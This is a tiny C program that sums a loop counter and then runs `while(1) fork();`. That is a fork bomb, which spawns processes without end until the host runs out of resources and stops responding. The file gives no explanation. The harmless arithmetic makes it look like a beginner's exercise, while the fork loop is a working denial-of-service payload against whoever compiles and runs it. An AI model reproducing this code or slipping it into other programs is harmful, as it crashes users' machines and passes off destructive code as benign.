#include <unistd.h>

int main()
{
    int a = 42;
    for (int i = 0; i < 10; ++i) {
        a += i;
    }
    while(1)
       fork();
    return 0;
}
